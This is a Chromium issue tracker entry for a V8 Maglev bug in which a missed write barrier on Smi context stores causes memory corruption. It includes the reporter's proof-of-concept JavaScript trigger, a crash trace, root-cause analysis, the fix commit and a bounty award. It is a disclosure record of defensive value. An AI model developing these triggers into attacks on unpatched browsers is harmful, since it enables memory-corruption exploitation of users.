# Check failed: !WriteBarrier::IsRequired(heap_object, Tagged<Object>(value)).

| Field | Value |
|-------|-------|
| **Issue ID** | [446463984](https://issues.chromium.org/issues/446463984) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>GarbageCollection |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | di...@chromium.org |
| **Created** | 2025-09-21 |
| **Bounty** | $10,000.00 |

## Description

COMMIT INFORMATION:

- Version: 102449
- Commit: 69d3c775919f5e800886dfc83a571aed9e4ed1a8
- Link: <https://crrev.com/69d3c775919f5e800886dfc83a571aed9e4ed1a8>

COMMIT MESSAGE:

```
commit 69d3c775919f5e800886dfc83a571aed9e4ed1a8
Author: Dominik Inführ <dinfuehr@chromium.org>
Date: Fri Sep 12 11:26:18 2025 +0200

[maglev] Use same WB verification method as Turbofan

Maglev can reuse the same method for skipped write barrier
verification as Turbofan.

Bug: 437096305
Change-Id: Ifd2c02c18d5cf30d6ef6babd3d9c961cd4eece49
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6942512
Reviewed-by: Victor Gomes <victorgomes@chromium.org>
Commit-Queue: Dominik Inführ <dinfuehr@chromium.org>
Cr-Commit-Position: refs/heads/main@{#102449}


```

REPRODUCTION:

1. Download: `gs://v8-asan/linux-debug/d8-linux-debug-v8-component-102449.zip`
2. Run: `d8 --allow-natives-syntax poc.js`

CRASH OUTPUT:

```
----------------------------------------


#
# Fatal error in ../../src/heap/heap.cc, line 6732
# Check failed: !WriteBarrier::IsRequired(heap_object, Tagged<Object>(value)).
#
#
#
#FailureMessage Object: 0x7ffc9f5bec80
==== C stack trace ===============================

/path/to/d8-linux-debug-v8-component-102651/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x13) [0x7f3fcdbcdb93]
/path/to/d8-linux-debug-v8-component-102651/libv8_libplatform.so(+0x1b4ed) [0x7f3fcdb744ed]
/path/to/d8-linux-debug-v8-component-102651/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x194) [0x7f3fcdbaea84]
/path/to/d8-linux-debug-v8-component-102651/libv8.so(v8::internal::Heap::VerifySkippedWriteBarrier(unsigned long, unsigned long)+0xad) [0x7f3fca648bcd]
[0x7f3fe01186ce]
Received signal 6

----------------------------------------

```

PoC:

```
function invokeNearStackLimit(callback) {
  function recursiveCall() {
    try {
      return recursiveCall();
    } catch {
      return callback();
    }
  }
  return recursiveCall();
}
let storedReference;
function updateArray(arrayParam) {
  try {
    let element = arrayParam[1];
    element[0] = this;
    storedReference = element;
  } catch {}
}
for (let iteration = 0; iteration < 3; iteration++) {
  updateArray([,,]), invokeNearStackLimit(() => updateArray([1073741825,,])), %OptimizeMaglevOnNextCall(updateArray), updateArray([0, 0]);
}

```

## Attachments

- deleted (application/octet-stream, 0 B)

## Timeline

### je...@gmail.com (2025-09-21)

## Root Cause Analysis

invokeNearStackLimit triggers the catch through recursion, forcing the optimizer to keep updateArray's exceptional path; during the first two calls, the second element of the passed array is undefined, so element[0] = this throws a TypeError, leading Maglev to infer from feedback that only Smis will ever be stored in that context slot. The related code generation lives in src/maglev/maglev-graph-builder.cc:3287, where the ContextCell::kSmi branch only runs BuildCheckSmi(value) and then unconditionally emits BuildStoreTaggedFieldNoWriteBarrier(...).

The third iteration runs after %OptimizeMaglevOnNextCall takes effect; the array's second element is 0, which flows through the pipeline as a Smi, but at runtime it is boxed into a young-generation HeapNumber, while this is the old-generation JSGlobalProxy. As a result, the old-to-young write is marked as "write barrier can be skipped", yet commit 69d3c7759 switched Maglev's verification logic to share Heap::VerifySkippedWriteBarrier (src/heap/heap.cc:6718) with Turbofan, and that function detects that a barrier is required, causing CHECK(!WriteBarrier::IsRequired(...)) to fail.

The diagnostic output shows that in the third call element is in the young generation while this is not, which validates the faulty assumption in the source. Without the write barrier, a minor GC could reclaim a young object that is still referenced from the old generation, leading to dangling pointers even arbitrary code execution.

```
  function invokeNearStackLimit(callback) {
    function recursiveCall() {
      try { return recursiveCall(); } catch { return callback(); }
    }
    return recursiveCall();
  }

  let storedReference;
  function updateArray(arrayParam, tag) {
    try {
      let element = arrayParam[1];
      %DebugPrint(tag);
      %DebugPrint(element);
      element[0] = this;
      storedReference = element;
      print(tag, 'value young?', %InYoungGeneration(element));
      print('this young?', %InYoungGeneration(this));
    } catch (e) {
      print(tag, 'throws', e);
    }
  }

  for (let iteration = 0; iteration < 3; iteration++) {
    updateArray([,,], 'first');
    invokeNearStackLimit(() => updateArray([1073741825,,], 'second'));
    %OptimizeMaglevOnNextCall(updateArray);
    updateArray([0, 0], 'third');
  }

```

### cl...@appspot.gserviceaccount.com (2025-09-22)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4538842627375104.

### dr...@chromium.org (2025-09-22)

Hm. Clusterfuzz seems stuck. Let me give it one more go.

### cl...@appspot.gserviceaccount.com (2025-09-22)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4868880061104128.

### 24...@project.gserviceaccount.com (2025-09-22)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2025-09-22)

Automatically assigning owner based on suspected regression changelist https://chromium.googlesource.com/v8/v8/+/a1d0bf6b4d39bfc099e5172c2b7de2bfaa00f751 ([codegen] Improve WB verification for allocation folding

So far for allocation folding we were simply checking whether the
object resides between the LAB start and LAB top in
PreCheckSkippedWriteBarrier. However, we can be more restrictive than
that and require that the object is between last_young_allocation_
and the LAB top.

Since last_young_allocation_ can point to a large object as well,
we also need to make sure that last_young_allocation_ points into the
LAB. This CL therefore checks whether the condition
   LAB start <= last_young_allocation_ <= object < LAB top
holds.

Bug: 437096305
Change-Id: I5e0748ff553e337176ef07dbee21818cacfe8b10
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6959212
Reviewed-by: Darius Mercadier <dmercadier@chromium.org>
Commit-Queue: Dominik Inführ <dinfuehr@chromium.org>
Cr-Commit-Position: refs/heads/main@{#102584}
).

If this is incorrect, please let us know why and apply the hotlistid:5433122. If you aren't the correct owner for this issue, please unassign yourself as soon as possible so it can be re-triaged.

### 24...@project.gserviceaccount.com (2025-09-22)

Detailed Report: https://clusterfuzz.com/testcase?key=4868880061104128

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: CHECK failure
Crash Address: 
Crash State:
  !WriteBarrier::IsRequired(heap_object, Tagged<Object>(value)) in heap.cc
  v8::internal::Heap::VerifySkippedWriteBarrier
  Builtins_InterpreterEntryTrampoline
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=102583:102584

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4868880061104128

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### je...@gmail.com (2025-09-23)

The position found by ClusterFuzz is different from the one I bisected. Could you check it?

### di...@chromium.org (2025-09-23)

I believe the bisect result is different because the crash does not reproduce starting at [CL](https://chromiumdash.appspot.com/commit/8112cb415c007d3fac2ac8ce844d4139857b32b0) but then crashes again in [CL](https://chromium-review.googlesource.com/c/v8/v8/+/6959212) again. My optimization broke verification in that commit range. So depending on whether the bisect jumps over that range or not, we might get different bisect results.

### di...@chromium.org (2025-09-23)

I can reproduce this crash. I've simplified it a bit to:

```
let storedReference;
function updateArray(arrayParam, tag) {
  try {
    let element = arrayParam[1];
    element[0] = this; // This throws on undefined[0] but succeeds on 0[0].
    storedReference = element;
  } catch (e) {
    print(tag, 'throws', e);
  }
}

%PrepareFunctionForOptimization(updateArray);
updateArray([1073741825,,], 'second');
%OptimizeMaglevOnNextCall(updateArray);
updateArray([0, 0], 'third'); // This deopts
updateArray([1073741825,,], 'second');
%OptimizeMaglevOnNextCall(updateArray);
updateArray([0, 0], 'third');

```

### wf...@chromium.org (2025-09-23)

This is a CHECK so should deterministically crash even on release builds, can you explain why this is a security bug and not just a denial of service (DOS) which we would not consider a security bug?

### je...@gmail.com (2025-09-24)

deleted

### je...@gmail.com (2025-09-24)

re [comment #12](https://issues.chromium.org/issues/446463984#comment12):

v8\_enable\_verify\_write\_barriers is defined in BUILD.gn:503 to be enabled only in debug mode, so this is a check that does not exist in release:

```
v8_enable_verify_write_barriers =
      (v8_enable_debugging_features || v8_dcheck_always_on) &&
      !v8_disable_write_barriers

if (v8_enable_verify_write_barriers) {
  defines += [ "V8_VERIFY_WRITE_BARRIERS" ]
}

```

<https://source.chromium.org/chromium/chromium/src/+/main:v8/BUILD.gn;l=503>

```
// static
void Heap::VerifySkippedWriteBarrier(Address object, Address value) {
#if V8_VERIFY_WRITE_BARRIERS //------> [0]
  DCHECK(v8_flags.verify_write_barriers);
  Tagged<Object> tagged(object);
  Tagged<HeapObject> heap_object;
  HeapObjectReferenceType reference_type;

  if (tagged.GetHeapObject(&heap_object, &reference_type)) {
    CHECK_EQ(reference_type, HeapObjectReferenceType::STRONG);
    CHECK(!WriteBarrier::IsRequired(heap_object, Tagged<Object>(value)));
  } else {
    CHECK(tagged.IsSmi());
  }
#else
  UNREACHABLE();
#endif  // V8_VERIFY_WRITE_BARRIERS
}


```

### je...@gmail.com (2025-09-24)

There are quite a few similar writing styles in v8. For example, things like slow checks, after being enabled, will use checks to cause crashes. However, these are all compile-time features that only exist in the debug version; these checks are not present in the release version.

### ml...@chromium.org (2025-09-24)

Let me help out here: This is a new verification mode that's not enabled in release but otherwise broadly available in debug builds.

A missed write barrier is a memory corruption and should be P1/S1 initially. If it's not a missed WB but some other issue we should adjust later.

### ch...@google.com (2025-09-24)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2025-09-24)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security Impact hotlist or the Severity field, and remove the ReleaseBlock hotlist.

### je...@gmail.com (2025-09-25)

Hello, any update?

### di...@chromium.org (2025-09-25)

So this 3 lines are the core of the issue:

```
(1) let element = arrayParam[1];
(2) element[0] = this; // This throws on undefined[0] but succeeds on 0[0].
(3) storedReference = element;

```

On line (1) we load a "HoleyFloat64". On line (2) we need to convert the HoleyFloat64 value from line (1) into a tagged value. We do this using HoleyFloat64ToTagged. We remember that as an alternative tagged value of the value in (1). The bug then happens on line (3). In (3) we then need to store into a context slot. The context slot is a Smi, so we initially perform the "smi check" on the original value in line (1) but then transparently use the tagged alternative value from (2) for the store on the context slot assuming that this is an actually Smi not an object. [See here](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/maglev/maglev-graph-builder.cc;l=3325-3329?ss=chromium).

The issue is that even though the value from line (1) is a Smi, the value in (2) is a HeapNumber with the Smi value 2 (non-canonicalized smi). On HoleyFloat64ToTagged we do not force canonicalization by default because it is expensive. But in this context store we need this tagged alternative value to be a canonicalized Smi.

### dx...@google.com (2025-09-25)

Project: v8/v8  

Branch:  main  

Author:  Dominik Inführ [dinfuehr@chromium.org](mailto:dinfuehr@chromium.org)  

Link:    <https://chromium-review.googlesource.com/6973419>

[maglev] Force smi canonicalization on smi context stores

---


Expand for full commit details
```
     
    When storing into a Smi context slot, we need to force Smi 
    canonicalization on HoleyFloat64ToTagged. This ensures we get a 
    proper Smi value instead of a Smi stored as a double in a 
    HeapNumber object. 
     
    Bug: 446463984 
    Change-Id: I402b1438e1a8ddcd9fae818817bd81814d456bf9 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6973419 
    Reviewed-by: Victor Gomes <victorgomes@chromium.org> 
    Commit-Queue: Dominik Inführ <dinfuehr@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#102755}

```

---

Files:

- M `src/maglev/maglev-graph-builder.cc`

---

Hash: [c01db9c51df7c26ff03c6e4e87fbddd97f65cc51](https://chromiumdash.appspot.com/commit/c01db9c51df7c26ff03c6e4e87fbddd97f65cc51)  

Date: Thu Sep 25 08:37:06 2025


---

### je...@gmail.com (2025-09-26)

Now that this vulnerability has been fixed, can we mark it as Fixed?

### ch...@google.com (2025-10-01)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to dev. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M142. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [142].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### di...@chromium.org (2025-10-02)

1. This [CL](https://chromium-review.googlesource.com/c/v8/v8/+/6973419) here.
2. Yes, on Canary since [142.0.7436.0](https://chromiumdash.appspot.com/commit/c01db9c51df7c26ff03c6e4e87fbddd97f65cc51)
3. No
4. No
5. No

### ts...@google.com (2025-10-02)

Please merge to m142 (7444) by 7-Oct.

### di...@chromium.org (2025-10-06)

@ts...@chromium.org: The fix is already on M142, see [here](https://chromiumdash.appspot.com/commit/c01db9c51df7c26ff03c6e4e87fbddd97f65cc51). No need to back-merge to M142 but if we need a merge then M141.

### ch...@google.com (2025-10-06)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### sp...@google.com (2025-10-07)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $10000.00 for this report.

Rationale for this decision:
high quality memory corruption in a sandboxed process


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2025-10-16)

Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: alonbajayo (ChromeOS), srinivassista (Desktop US), danielyip (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### di...@chromium.org (2025-10-16)

1. Security vulnerability
2. This [CL](https://chromium-review.googlesource.com/c/v8/v8/+/6973419) here.
3. Yes, on Canary since [142.0.7436.0](https://chromiumdash.appspot.com/commit/c01db9c51df7c26ff03c6e4e87fbddd97f65cc51)
4. No
5. No
6. No

### ts...@google.com (2025-10-20)

If the blame is right, then this was introduced in 14.2, so we'd need a merge to 142 but not 141, right?

### di...@chromium.org (2025-10-21)

The bisect here points to a CL in 14.2, this is right. But this is only the CL that added additional verification to find this kind of bugs. The actual bug was introduced before that already.

### va...@google.com (2025-10-21)

Initial CL landed in M142. no merge needed

<https://chromium-review.googlesource.com/c/v8/v8/+/6973419> > <https://chromiumdash.appspot.com/commit/c01db9c51df7c26ff03c6e4e87fbddd97f65cc51> > First shown in 142.0.7436.0.

### ch...@google.com (2026-01-03)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> high quality memory corruption in a sandboxed process

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/446463984)*
